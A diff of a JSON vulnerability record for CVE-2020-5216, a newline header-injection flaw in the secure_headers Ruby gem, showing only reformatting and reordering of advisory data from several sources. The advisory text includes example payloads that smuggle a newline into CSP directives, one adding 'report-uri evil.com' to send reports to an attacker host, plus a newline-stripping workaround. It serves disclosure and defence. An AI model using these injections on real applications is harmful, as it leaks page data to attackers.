@@ -1,319 +1,325 @@
 {
-    "GSD": {
-        "alias": "CVE-2020-5216",
-        "description": "In Secure Headers (RubyGem secure_headers), a directive injection vulnerability is present in versions before 3.9.0, 5.2.0, and 6.3.0. If user-supplied input was passed into append/override_content_security_policy_directives, a newline could be injected leading to limited header injection. Upon seeing a newline in the header, rails will silently create a new Content-Security-Policy header with the remaining value of the original string. It will continue to create new headers for each newline. This has been fixed in 6.3.0, 5.2.0, and 3.9.0.",
-        "id": "GSD-2020-5216",
-        "references": [
-            "https://access.redhat.com/errata/RHSA-2020:4366"
-        ]
+  "GSD": {
+    "alias": "CVE-2020-5216",
+    "description": "In Secure Headers (RubyGem secure_headers), a directive injection vulnerability is present in versions before 3.9.0, 5.2.0, and 6.3.0. If user-supplied input was passed into append/override_content_security_policy_directives, a newline could be injected leading to limited header injection. Upon seeing a newline in the header, rails will silently create a new Content-Security-Policy header with the remaining value of the original string. It will continue to create new headers for each newline. This has been fixed in 6.3.0, 5.2.0, and 3.9.0.",
+    "id": "GSD-2020-5216",
+    "references": [
+      "https://access.redhat.com/errata/RHSA-2020:4366"
+    ]
+  },
+  "gsd": {
+    "metadata": {
+      "exploitCode": "unknown",
+      "remediation": "unknown",
+      "reportConfidence": "confirmed",
+      "type": "vulnerability"
     },
-    "gsd": {
-        "osvSchema": {
-            "schema_version": "1.4.0",
-            "id": "GSD-2020-5216",
-            "modified": "2020-01-23T00:00:00.000Z",
-            "published": "2020-01-23T00:00:00.000Z",
-            "aliases": [
-                "CVE-2020-5216",
-                "GHSA-w978-rmpf-qmwg"
-            ],
-            "summary": "secure_headers header injection due to newline",
-            "details": "If user-supplied input was passed into append/override_content_security_policy_directives,\na newline could be injected leading to limited header injection.\n\nUpon seeing a newline in the header, rails will silently create a new Content-Security-Policy\nheader with the remaining value of the original string. It will continue to create new headers\nfor each newline.\n\ne.g.\n\n```\noverride_content_security_directives(script_src: ['mycdn.com', \"\\ninjected\\n\"])\n```\n\nwould result in\n\n```\nContent-Security-Policy: ... script-src: mycdn.com\nContent-Security-Policy: injected\nContent-Security-Policy: rest-of-the-header\n```\n\nCSP supports multiple headers and all policies must be satisfied for execution to occur, but a malicious value that reports the current page is fairly trivial:\n\n```\noverride_content_security_directives(script_src: [\"mycdn.com\", \"\\ndefault-src 'none'; report-uri evil.com\"])\n```\n\n```\nContent-Security-Policy: ... script-src: mycdn.com\nContent-Security-Policy: default-src 'none'; report-uri evil.com\nContent-Security-Policy: rest-of-the-header\n```\n\nWorkarounds\n```\noverride_content_security_policy_directives(:frame_src, [user_input.gsub(\"\\n\", \" \")])\n```",
-            "severity": [
-                {
-                    "type": "CVSS_V3",
-                    "score": 4.4
-                }
-            ],
-            "affected": [
-                {
-                    "package": {
-                        "ecosystem": "RubyGems",
-                        "name": "secure_headers",
-                        "purl": "pkg:gem/secure_headers"
-                    }
-                }
-            ],
-            "references": [
-                {
-                    "type": "WEB",
-                    "url": "https://github.com/twitter/secure_headers/security/advisories/GHSA-w978-rmpf-qmwg"
-                }
-            ]
+    "osvSchema": {
+      "affected": [
+        {
+          "package": {
+            "ecosystem": "RubyGems",
+            "name": "secure_headers",
+            "purl": "pkg:gem/secure_headers"
+          }
         }
-    },
-    "namespaces": {
-        "cve.org": {
-            "CVE_data_meta": {
-                "ASSIGNER": "security-advisories@github.com",
-                "ID": "CVE-2020-5216",
-                "STATE": "PUBLIC",
-                "TITLE": "Limited header injection when using dynamic overrides with user input in RubyGems secure_headers"
-            },
-            "affects": {
-                "vendor": {
-                    "vendor_data": [
+      ],
+      "aliases": [
+        "CVE-2020-5216",
+        "GHSA-w978-rmpf-qmwg"
+      ],
+      "details": "If user-supplied input was passed into append/override_content_security_policy_directives,\na newline could be injected leading to limited header injection.\n\nUpon seeing a newline in the header, rails will silently create a new Content-Security-Policy\nheader with the remaining value of the original string. It will continue to create new headers\nfor each newline.\n\ne.g.\n\n```\noverride_content_security_directives(script_src: ['mycdn.com', \"\\ninjected\\n\"])\n```\n\nwould result in\n\n```\nContent-Security-Policy: ... script-src: mycdn.com\nContent-Security-Policy: injected\nContent-Security-Policy: rest-of-the-header\n```\n\nCSP supports multiple headers and all policies must be satisfied for execution to occur, but a malicious value that reports the current page is fairly trivial:\n\n```\noverride_content_security_directives(script_src: [\"mycdn.com\", \"\\ndefault-src 'none'; report-uri evil.com\"])\n```\n\n```\nContent-Security-Policy: ... script-src: mycdn.com\nContent-Security-Policy: default-src 'none'; report-uri evil.com\nContent-Security-Policy: rest-of-the-header\n```\n\nWorkarounds\n```\noverride_content_security_policy_directives(:frame_src, [user_input.gsub(\"\\n\", \" \")])\n```",
+      "id": "GSD-2020-5216",
+      "modified": "2020-01-23T00:00:00.000Z",
+      "published": "2020-01-23T00:00:00.000Z",
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/twitter/secure_headers/security/advisories/GHSA-w978-rmpf-qmwg"
+        }
+      ],
+      "schema_version": "1.4.0",
+      "severity": [
+        {
+          "score": 4.4,
+          "type": "CVSS_V3"
+        }
+      ],
+      "summary": "secure_headers header injection due to newline"
+    }
+  },
+  "namespaces": {
+    "cve.org": {
+      "CVE_data_meta": {
+        "ASSIGNER": "security-advisories@github.com",
+        "ID": "CVE-2020-5216",
+        "STATE": "PUBLIC",
+        "TITLE": "Limited header injection when using dynamic overrides with user input in RubyGems secure_headers"
+      },
+      "affects": {
+        "vendor": {
+          "vendor_data": [
+            {
+              "product": {
+                "product_data": [
+                  {
+                    "product_name": "secure_headers",
+                    "version": {
+                      "version_data": [
                         {
-                            "product": {
-                                "product_data": [
-                                    {
-                                        "product_name": "secure_headers",
-                                        "version": {
-                                            "version_data": [
-                                                {
-                                                    "version_value": "< 3.9.0"
-                                                },
-                                                {
-                                                    "version_value": ">= 5.0.0, < 5.2.0"
-                                                },
-                                                {
-                                                    "version_value": ">= 6.0.0, < 6.3.0"
-                                                }
-                                            ]
-                                        }
-                                    }
-                                ]
-                            },
-                            "vendor_name": "Twitter"
-                        }
-                    ]
-                }
-            },
-            "data_format": "MITRE",
-            "data_type": "CVE",
-            "data_version": "4.0",
-            "description": {
-                "description_data": [
-                    {
-                        "lang": "eng",
-                        "value": "In Secure Headers (RubyGem secure_headers), a directive injection vulnerability is present in versions before 3.9.0, 5.2.0, and 6.3.0. If user-supplied input was passed into append/override_content_security_policy_directives, a newline could be injected leading to limited header injection. Upon seeing a newline in the header, rails will silently create a new Content-Security-Policy header with the remaining value of the original string. It will continue to create new headers for each newline. This has been fixed in 6.3.0, 5.2.0, and 3.9.0."
-                    }
-                ]
-            },
-            "impact": {
-                "cvss": {
-                    "attackComplexity": "HIGH",
-                    "attackVector": "NETWORK",
-                    "availabilityImpact": "NONE",
-                    "baseScore": 4.4,
-                    "baseSeverity": "MEDIUM",
-                    "confidentialityImpact": "LOW",
-                    "integrityImpact": "LOW",
-                    "privilegesRequired": "LOW",
-                    "scope": "CHANGED",
-                    "userInteraction": "REQUIRED",
-                    "vectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:L/I:L/A:N",
-                    "version": "3.1"
-                }
-            },
-            "problemtype": {
-                "problemtype_data": [
-                    {
-                        "description": [
-                            {
-                                "lang": "eng",
-                                "value": "CWE-113 Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')"
-                            }
-                        ]
-                    }
-                ]
-            },
-            "references": {
-                "reference_data": [
-                    {
-                        "name": "https://github.com/twitter/secure_headers/security/advisories/GHSA-w978-rmpf-qmwg",
-                        "refsource": "CONFIRM",
-                        "url": "https://github.com/twitter/secure_headers/security/advisories/GHSA-w978-rmpf-qmwg"
-                    },
-                    {
-                        "name": "https://github.com/twitter/secure_headers/commit/301695706f6a70517c2a90c6ef9b32178440a2d0",
-                        "refsource": "MISC",
-                        "url": "https://github.com/twitter/secure_headers/commit/301695706f6a70517c2a90c6ef9b32178440a2d0"
-                    }
-                ]
-            },
-            "source": {
-                "advisory": "GHSA-w978-rmpf-qmwg",
-                "discovery": "UNKNOWN"
-            }
-        },
-        "gitlab.com": {
-            "advisories": [
-                {
-                    "affected_range": "<3.9.0||>=5.0.0 <5.2.0||>=6.0.0 <6.3.0",
-                    "affected_versions": "All versions before 3.9.0, all versions starting from 5.0.0 before 5.2.0, all versions starting from 6.0.0 before 6.3.0",
-                    "cvss_v2": "AV:N/AC:L/Au:N/C:N/I:P/A:N",
-                    "cvss_v3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:L/A:N",
-                    "cwe_ids": [
-                        "CWE-1035",
-                        "CWE-74",
-                        "CWE-937"
-                    ],
-                    "date": "2020-02-18",
-                    "description": "If user-supplied input is passed into `append/override_content_security_policy_directives`, a newline could be injected leading to limited header injection. Upon seeing a newline in the header, rails will silently create a new `Content-Security-Policy` header with the remaining value of the original string. It will continue to create new headers for each newline.",
-                    "fixed_versions": [
-                        "3.9.0",
-                        "5.2.0",
-                        "6.3.0"
-                    ],
-                    "identifier": "CVE-2020-5216",
-                    "identifiers": [
-                        "CVE-2020-5216",
-                        "GHSA-w978-rmpf-qmwg"
-                    ],
-                    "not_impacted": "All versions starting from 3.9.0 before 5.0.0, all versions starting from 5.2.0 before 6.0.0, all versions starting from 6.3.0",
-                    "package_slug": "gem/secure_headers",
-                    "pubdate": "2020-01-23",
-                    "solution": "Upgrade to versions 3.9.0, 5.2.0, 6.3.0 or above.",
-                    "title": "Injection Vulnerability",
-                    "urls": [
-                        "https://nvd.nist.gov/vuln/detail/CVE-2020-5216"
-                    ],
-                    "uuid": "9771277e-84e2-40b0-9337-a80e649f3d49"
-                }
-            ]
-        },
-        "nvd.nist.gov": {
-            "configurations": {
-                "CVE_data_version": "4.0",
-                "nodes": [
-                    {
-                        "children": [],
-                        "cpe_match": [
-                            {
-                                "cpe23Uri": "cpe:2.3:a:twitter:secure_headers:*:*:*:*:*:ruby:*:*",
-                                "cpe_name": [],
-                                "versionEndExcluding": "3.9.0",
-                                "vulnerable": true
-                            },
-                            {
-                                "cpe23Uri": "cpe:2.3:a:twitter:secure_headers:*:*:*:*:*:ruby:*:*",
-                                "cpe_name": [],
-                                "versionEndExcluding": "5.2.0",
-                                "versionStartIncluding": "5.0.0",
-                                "vulnerable": true
-                            },
-                            {
-                                "cpe23Uri": "cpe:2.3:a:twitter:secure_headers:*:*:*:*:*:ruby:*:*",
-                                "cpe_name": [],
-                                "versionEndExcluding": "6.3.0",
-                                "versionStartIncluding": "6.0.0",
-                                "vulnerable": true
-                            }
-                        ],
-                        "operator": "OR"
-                    }
-                ]
-            },
-            "cve": {
-                "CVE_data_meta": {
-                    "ASSIGNER": "security-advisories@github.com",
-                    "ID": "CVE-2020-5216"
-                },
-                "data_format": "MITRE",
-                "data_type": "CVE",
-                "data_version": "4.0",
-                "description": {
-                    "description_data": [
-                        {
-                            "lang": "en",
-                            "value": "In Secure Headers (RubyGem secure_headers), a directive injection vulnerability is present in versions before 3.9.0, 5.2.0, and 6.3.0. If user-supplied input was passed into append/override_content_security_policy_directives, a newline could be injected leading to limited header injection. Upon seeing a newline in the header, rails will silently create a new Content-Security-Policy header with the remaining value of the original string. It will continue to create new headers for each newline. This has been fixed in 6.3.0, 5.2.0, and 3.9.0."
-                        }
-                    ]
-                },
-                "problemtype": {
-                    "problemtype_data": [
-                        {
-                            "description": [
-                                {
-                                    "lang": "en",
-                                    "value": "CWE-74"
-                                }
-                            ]
-                        }
-                    ]
-                },
-                "references": {
-                    "reference_data": [
-                        {
-                            "name": "https://github.com/twitter/secure_headers/security/advisories/GHSA-w978-rmpf-qmwg",
-                            "refsource": "CONFIRM",
-                            "tags": [
-                                "Exploit",
-                                "Mitigation",
-                                "Third Party Advisory"
-                            ],
-                            "url": "https://github.com/twitter/secure_headers/security/advisories/GHSA-w978-rmpf-qmwg"
+                          "version_value": "< 3.9.0"
                         },
                         {
-                            "name": "https://github.com/twitter/secure_headers/commit/301695706f6a70517c2a90c6ef9b32178440a2d0",
-                            "refsource": "MISC",
-                            "tags": [
-                                "Patch"
-                            ],
-                            "url": "https://github.com/twitter/secure_headers/commit/301695706f6a70517c2a90c6ef9b32178440a2d0"
+                          "version_value": ">= 5.0.0, < 5.2.0"
+                        },
+                        {
+                          "version_value": ">= 6.0.0, < 6.3.0"
                         }
-                    ]
-                }
-            },
-            "impact": {
-                "baseMetricV2": {
-                    "acInsufInfo": false,
-                    "cvssV2": {
-                        "accessComplexity": "LOW",
-                        "accessVector": "NETWORK",
-                        "authentication": "NONE",
-                        "availabilityImpact": "NONE",
-                        "baseScore": 5.0,
-                        "confidentialityImpact": "NONE",
-                        "integrityImpact": "PARTIAL",
-                        "vectorString": "AV:N/AC:L/Au:N/C:N/I:P/A:N",
-                        "version": "2.0"
-                    },
-                    "exploitabilityScore": 10.0,
-                    "impactScore": 2.9,
-                    "obtainAllPrivilege": false,
-                    "obtainOtherPrivilege": false,
-                    "obtainUserPrivilege": false,
-                    "severity": "MEDIUM",
-                    "userInteractionRequired": false
-                },
-                "baseMetricV3": {
-                    "cvssV3": {
-                        "attackComplexity": "LOW",
-                        "attackVector": "NETWORK",
-                        "availabilityImpact": "NONE",
-                        "baseScore": 5.8,
-                        "baseSeverity": "MEDIUM",
-                        "confidentialityImpact": "NONE",
-                        "integrityImpact": "LOW",
-                        "privilegesRequired": "NONE",
-                        "scope": "CHANGED",
-                        "userInteraction": "NONE",
-                        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:L/A:N",
-                        "version": "3.1"
-                    },
-                    "exploitabilityScore": 3.9,
-                    "impactScore": 1.4
-                }
-            },
-            "lastModifiedDate": "2020-02-18T14:58Z",
-            "publishedDate": "2020-01-23T03:15Z"
-        },
-        "github.com/rubysec/ruby-advisory-db": {
-            "gem": "secure_headers",
-            "cve": "2020-5216",
-            "ghsa": "w978-rmpf-qmwg",
-            "url": "https://github.com/twitter/secure_headers/security/advisories/GHSA-w978-rmpf-qmwg",
-            "title": "secure_headers header injection due to newline",
-            "date": "2020-01-23",
-            "description": "If user-supplied input was passed into append/override_content_security_policy_directives,\na newline could be injected leading to limited header injection.\n\nUpon seeing a newline in the header, rails will silently create a new Content-Security-Policy\nheader with the remaining value of the original string. It will continue to create new headers\nfor each newline.\n\ne.g.\n\n```\noverride_content_security_directives(script_src: ['mycdn.com', \"\\ninjected\\n\"])\n```\n\nwould result in\n\n```\nContent-Security-Policy: ... script-src: mycdn.com\nContent-Security-Policy: injected\nContent-Security-Policy: rest-of-the-header\n```\n\nCSP supports multiple headers and all policies must be satisfied for execution to occur, but a malicious value that reports the current page is fairly trivial:\n\n```\noverride_content_security_directives(script_src: [\"mycdn.com\", \"\\ndefault-src 'none'; report-uri evil.com\"])\n```\n\n```\nContent-Security-Policy: ... script-src: mycdn.com\nContent-Security-Policy: default-src 'none'; report-uri evil.com\nContent-Security-Policy: rest-of-the-header\n```\n\nWorkarounds\n```\noverride_content_security_policy_directives(:frame_src, [user_input.gsub(\"\\n\", \" \")])\n```",
-            "cvss_v3": 4.4,
-            "patched_versions": [
-                "~> 3.9",
-                "~> 5.2",
-                ">= 6.3.0"
-            ]
+                      ]
+                    }
+                  }
+                ]
+              },
+              "vendor_name": "Twitter"
+            }
+          ]
         }
+      },
+      "data_format": "MITRE",
+      "data_type": "CVE",
+      "data_version": "4.0",
+      "description": {
+        "description_data": [
+          {
+            "lang": "eng",
+            "value": "In Secure Headers (RubyGem secure_headers), a directive injection vulnerability is present in versions before 3.9.0, 5.2.0, and 6.3.0. If user-supplied input was passed into append/override_content_security_policy_directives, a newline could be injected leading to limited header injection. Upon seeing a newline in the header, rails will silently create a new Content-Security-Policy header with the remaining value of the original string. It will continue to create new headers for each newline. This has been fixed in 6.3.0, 5.2.0, and 3.9.0."
+          }
+        ]
+      },
+      "impact": {
+        "cvss": {
+          "attackComplexity": "HIGH",
+          "attackVector": "NETWORK",
+          "availabilityImpact": "NONE",
+          "baseScore": 4.4,
+          "baseSeverity": "MEDIUM",
+          "confidentialityImpact": "LOW",
+          "integrityImpact": "LOW",
+          "privilegesRequired": "LOW",
+          "scope": "CHANGED",
+          "userInteraction": "REQUIRED",
+          "vectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:L/I:L/A:N",
+          "version": "3.1"
+        }
+      },
+      "problemtype": {
+        "problemtype_data": [
+          {
+            "description": [
+              {
+                "lang": "eng",
+                "value": "CWE-113 Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')"
+              }
+            ]
+          }
+        ]
+      },
+      "references": {
+        "reference_data": [
+          {
+            "name": "https://github.com/twitter/secure_headers/security/advisories/GHSA-w978-rmpf-qmwg",
+            "refsource": "CONFIRM",
+            "url": "https://github.com/twitter/secure_headers/security/advisories/GHSA-w978-rmpf-qmwg"
+          },
+          {
+            "name": "https://github.com/twitter/secure_headers/commit/301695706f6a70517c2a90c6ef9b32178440a2d0",
+            "refsource": "MISC",
+            "url": "https://github.com/twitter/secure_headers/commit/301695706f6a70517c2a90c6ef9b32178440a2d0"
+          }
+        ]
+      },
+      "source": {
+        "advisory": "GHSA-w978-rmpf-qmwg",
+        "discovery": "UNKNOWN"
+      }
+    },
+    "github.com/rubysec/ruby-advisory-db": {
+      "cve": "2020-5216",
+      "cvss_v3": 4.4,
+      "date": "2020-01-23",
+      "description": "If user-supplied input was passed into append/override_content_security_policy_directives,\na newline could be injected leading to limited header injection.\n\nUpon seeing a newline in the header, rails will silently create a new Content-Security-Policy\nheader with the remaining value of the original string. It will continue to create new headers\nfor each newline.\n\ne.g.\n\n```\noverride_content_security_directives(script_src: ['mycdn.com', \"\\ninjected\\n\"])\n```\n\nwould result in\n\n```\nContent-Security-Policy: ... script-src: mycdn.com\nContent-Security-Policy: injected\nContent-Security-Policy: rest-of-the-header\n```\n\nCSP supports multiple headers and all policies must be satisfied for execution to occur, but a malicious value that reports the current page is fairly trivial:\n\n```\noverride_content_security_directives(script_src: [\"mycdn.com\", \"\\ndefault-src 'none'; report-uri evil.com\"])\n```\n\n```\nContent-Security-Policy: ... script-src: mycdn.com\nContent-Security-Policy: default-src 'none'; report-uri evil.com\nContent-Security-Policy: rest-of-the-header\n```\n\nWorkarounds\n```\noverride_content_security_policy_directives(:frame_src, [user_input.gsub(\"\\n\", \" \")])\n```",
+      "gem": "secure_headers",
+      "ghsa": "w978-rmpf-qmwg",
+      "patched_versions": [
+        "~> 3.9",
+        "~> 5.2",
+        ">= 6.3.0"
+      ],
+      "title": "secure_headers header injection due to newline",
+      "url": "https://github.com/twitter/secure_headers/security/advisories/GHSA-w978-rmpf-qmwg"
+    },
+    "gitlab.com": {
+      "advisories": [
+        {
+          "affected_range": "<3.9.0||>=5.0.0 <5.2.0||>=6.0.0 <6.3.0",
+          "affected_versions": "All versions before 3.9.0, all versions starting from 5.0.0 before 5.2.0, all versions starting from 6.0.0 before 6.3.0",
+          "cvss_v2": "AV:N/AC:L/Au:N/C:N/I:P/A:N",
+          "cvss_v3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:L/A:N",
+          "cwe_ids": [
+            "CWE-1035",
+            "CWE-74",
+            "CWE-937"
+          ],
+          "date": "2020-02-18",
+          "description": "If user-supplied input is passed into `append/override_content_security_policy_directives`, a newline could be injected leading to limited header injection. Upon seeing a newline in the header, rails will silently create a new `Content-Security-Policy` header with the remaining value of the original string. It will continue to create new headers for each newline.",
+          "fixed_versions": [
+            "3.9.0",
+            "5.2.0",
+            "6.3.0"
+          ],
+          "identifier": "CVE-2020-5216",
+          "identifiers": [
+            "CVE-2020-5216",
+            "GHSA-w978-rmpf-qmwg"
+          ],
+          "not_impacted": "All versions starting from 3.9.0 before 5.0.0, all versions starting from 5.2.0 before 6.0.0, all versions starting from 6.3.0",
+          "package_slug": "gem/secure_headers",
+          "pubdate": "2020-01-23",
+          "solution": "Upgrade to versions 3.9.0, 5.2.0, 6.3.0 or above.",
+          "title": "Injection Vulnerability",
+          "urls": [
+            "https://nvd.nist.gov/vuln/detail/CVE-2020-5216"
+          ],
+          "uuid": "9771277e-84e2-40b0-9337-a80e649f3d49"
+        }
+      ]
+    },
+    "nvd.nist.gov": {
+      "configurations": {
+        "CVE_data_version": "4.0",
+        "nodes": [
+          {
+            "children": [],
+            "cpe_match": [
+              {
+                "cpe23Uri": "cpe:2.3:a:twitter:secure_headers:*:*:*:*:*:ruby:*:*",
+                "cpe_name": [],
+                "versionEndExcluding": "3.9.0",
+                "vulnerable": true
+              },
+              {
+                "cpe23Uri": "cpe:2.3:a:twitter:secure_headers:*:*:*:*:*:ruby:*:*",
+                "cpe_name": [],
+                "versionEndExcluding": "5.2.0",
+                "versionStartIncluding": "5.0.0",
+                "vulnerable": true
+              },
+              {
+                "cpe23Uri": "cpe:2.3:a:twitter:secure_headers:*:*:*:*:*:ruby:*:*",
+                "cpe_name": [],
+                "versionEndExcluding": "6.3.0",
+                "versionStartIncluding": "6.0.0",
+                "vulnerable": true
+              }
+            ],
+            "operator": "OR"
+          }
+        ]
+      },
+      "cve": {
+        "CVE_data_meta": {
+          "ASSIGNER": "security-advisories@github.com",
+          "ID": "CVE-2020-5216"
+        },
+        "data_format": "MITRE",
+        "data_type": "CVE",
+        "data_version": "4.0",
+        "description": {
+          "description_data": [
+            {
+              "lang": "en",
+              "value": "In Secure Headers (RubyGem secure_headers), a directive injection vulnerability is present in versions before 3.9.0, 5.2.0, and 6.3.0. If user-supplied input was passed into append/override_content_security_policy_directives, a newline could be injected leading to limited header injection. Upon seeing a newline in the header, rails will silently create a new Content-Security-Policy header with the remaining value of the original string. It will continue to create new headers for each newline. This has been fixed in 6.3.0, 5.2.0, and 3.9.0."
+            }
+          ]
+        },
+        "problemtype": {
+          "problemtype_data": [
+            {
+              "description": [
+                {
+                  "lang": "en",
+                  "value": "CWE-74"
+                }
+              ]
+            }
+          ]
+        },
+        "references": {
+          "reference_data": [
+            {
+              "name": "https://github.com/twitter/secure_headers/security/advisories/GHSA-w978-rmpf-qmwg",
+              "refsource": "CONFIRM",
+              "tags": [
+                "Exploit",
+                "Mitigation",
+                "Third Party Advisory"
+              ],
+              "url": "https://github.com/twitter/secure_headers/security/advisories/GHSA-w978-rmpf-qmwg"
+            },
+            {
+              "name": "https://github.com/twitter/secure_headers/commit/301695706f6a70517c2a90c6ef9b32178440a2d0",
+              "refsource": "MISC",
+              "tags": [
+                "Patch"
+              ],
+              "url": "https://github.com/twitter/secure_headers/commit/301695706f6a70517c2a90c6ef9b32178440a2d0"
+            }
+          ]
+        }
+      },
+      "impact": {
+        "baseMetricV2": {
+          "acInsufInfo": false,
+          "cvssV2": {
+            "accessComplexity": "LOW",
+            "accessVector": "NETWORK",
+            "authentication": "NONE",
+            "availabilityImpact": "NONE",
+            "baseScore": 5.0,
+            "confidentialityImpact": "NONE",
+            "integrityImpact": "PARTIAL",
+            "vectorString": "AV:N/AC:L/Au:N/C:N/I:P/A:N",
+            "version": "2.0"
+          },
+          "exploitabilityScore": 10.0,
+          "impactScore": 2.9,
+          "obtainAllPrivilege": false,
+          "obtainOtherPrivilege": false,
+          "obtainUserPrivilege": false,
+          "severity": "MEDIUM",
+          "userInteractionRequired": false
+        },
+        "baseMetricV3": {
+          "cvssV3": {
+            "attackComplexity": "LOW",
+            "attackVector": "NETWORK",
+            "availabilityImpact": "NONE",
+            "baseScore": 5.8,
+            "baseSeverity": "MEDIUM",
+            "confidentialityImpact": "NONE",
+            "integrityImpact": "LOW",
+            "privilegesRequired": "NONE",
+            "scope": "CHANGED",
+            "userInteraction": "NONE",
+            "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:L/A:N",
+            "version": "3.1"
+          },
+          "exploitabilityScore": 3.9,
+          "impactScore": 1.4
+        }
+      },
+      "lastModifiedDate": "2020-02-18T14:58Z",
+      "publishedDate": "2020-01-23T03:15Z"
     }
+  }
 }
